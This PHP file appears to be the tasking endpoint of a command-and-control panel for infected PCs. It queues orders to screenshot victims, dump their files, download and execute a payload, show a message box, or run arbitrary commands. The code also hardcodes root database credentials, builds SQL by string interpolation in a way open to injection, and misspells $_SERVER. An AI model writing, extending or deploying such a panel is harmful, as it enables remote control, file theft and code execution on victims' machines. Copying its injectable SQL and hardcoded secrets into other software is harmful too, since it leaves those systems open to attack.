<?php
if ($SERVER['REQUEST_METHOD'] === "POST" && isset($_POST['updator'])) {
    // echo "1<br>"; //tells you if you want a screenshot $user['screenshot']
    // echo "1<br>"; //tells you if you want to dump files and shit $user['dumpem']
    // echo "1<br>"; //tells you if there is a file which needs to be downloaded $user['downloadfile']
    // echo "PATH<br>"; //where the file is, if no file is to be dl+iex, then just set NULL $user['downloadpath']
    // echo "1<br>"; //show messagebox? $user['messagebox']
    // echo "MSG<br>"; //what do we put on the messagebox $user['messageforbox']
    // echo "1<br>"; //exec a CMD $user['execcmd']
    // echo "CMD<br>"; //which cmd to execute $user['toexec']
    $screenshot = $_POST['screenshot'];
    $dumpem = $_POST['dumpem'];
    $downloadfile = $_POST['downloadfile'];
    $downloadpath = $_POST['downloadpath'];
    $messagebox = $_POST['messagebox'];
    $messageforbox = $_POST['messageforbox'];
    $execcmd = $_POST['execcmd'];
    $toexec = $_POST['toexec'];

    $servername = "localhost";
    $username = "root";
    $password = "husb";
    $dbname = "pcs";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    $sql = "INSERT INTO todo (screenshot, dumpem, downloadfile, downloadpath, messagebox, messageforbox, execcmd, toexec) 
    VALUES ('$screenshot', '$dumpem', '$downloadfile', '$downloadpath', '$messagebox', '$messageforbox', '$execcmd', '$toexec')";

    if ($conn->query($sql) === TRUE) {
        echo "New record created successfully";
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    $conn->close();
}
?>